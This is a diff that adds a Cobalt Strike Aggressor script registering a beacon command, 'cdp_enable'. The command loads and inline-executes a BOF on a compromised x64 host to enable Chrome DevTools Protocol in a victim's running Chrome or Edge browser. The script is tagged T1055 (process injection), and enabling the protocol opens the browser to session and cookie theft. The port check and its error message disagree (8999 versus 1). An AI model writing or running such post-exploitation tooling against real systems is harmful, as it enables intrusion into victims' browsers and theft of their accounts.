@@ -1,0 +1,47 @@
+sub read_cdp_bof {
+    local('$handle $data');
+    $handle = openf(script_resource("cdp_enable_bof.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    if (strlen($data) == 0) {
+        berror($1, "could not read cdp_enable_bof.o");
+    }
+    return $data;
+}
+
+alias cdp_enable {
+    local('$browser $port $args');
+
+    if (size(@_) != 3) {
+        berror($1, beacon_command_detail("cdp_enable"));
+        return;
+    }
+
+    if (barch($1) ne "x64") {
+        berror($1, "cdp_enable requires an x64 beacon");
+        return;
+    }
+
+    $browser = lc($2);
+    $port = int($3);
+
+    if ($browser ne "edge" && $browser ne "chrome") {
+        berror($1, "browser must be 'edge' or 'chrome'");
+        return;
+    }
+
+    if ($port <= 8999 || $port > 65535) {
+        berror($1, "port must be between 1 and 65535");
+        return;
+    }
+
+    $args = bof_pack($1, "zi", $browser, $port);
+    btask($1, "Tasked beacon to enable CDP in $browser on port $port", "T1055");
+    beacon_inline_execute($1, read_cdp_bof($1), "go", $args);
+}
+
+beacon_command_register(
+    "cdp_enable",
+    "Enable Chrome DevTools Protocol in a running Chrome/Edge browser with the CDP BOF.",
+    "Usage: cdp_enable <edge|chrome> <port>"
+);
